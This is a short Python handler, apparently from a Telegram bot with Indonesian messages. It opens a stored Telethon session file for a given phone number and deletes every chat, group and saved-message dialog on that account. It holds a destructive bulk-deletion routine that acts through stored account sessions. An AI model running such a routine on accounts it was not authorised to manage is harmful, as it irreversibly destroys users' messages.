import os
import asyncio
from config import SESSION_FOLDER
from telethon import TelegramClient

async def hapus_pesan_handler(update, context, phone_number):

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(
            f"❌ Session tidak ditemukan untuk:\n`{phone_number}`\n\nCek path:\n`{session_path}`",
            parse_mode='Markdown'
        )
        return

    await update.callback_query.message.reply_text("🧹 Menghapus semua pesan...")

    try:
        client = TelegramClient(session_path, context.bot_data['api_id'], context.bot_data['api_hash'])
        await client.start()

        me = await client.get_me()
        print(f"✅ Login sebagai {me.username or me.first_name} ({me.phone})")

        # Menghapus semua dialog (termasuk Saved Message, grup, dll)
        dialogs = await client.get_dialogs()
        for dialog in dialogs:
            try:
                await client.delete_dialog(dialog.id)
                print(f"🗑️ Dialog '{dialog.name}' dihapus.")
            except Exception as e:
                print(f"❌ Gagal hapus dialog: {e}")

        await client.disconnect()
        await update.callback_query.message.reply_text("✅ Semua pesan berhasil dihapus.")

    except Exception as e:
        print("❌ Error:", e)
        await update.callback_query.message.reply_text(f"⚠️ Gagal hapus pesan:\n`{e}`", parse_mode='Markdown')
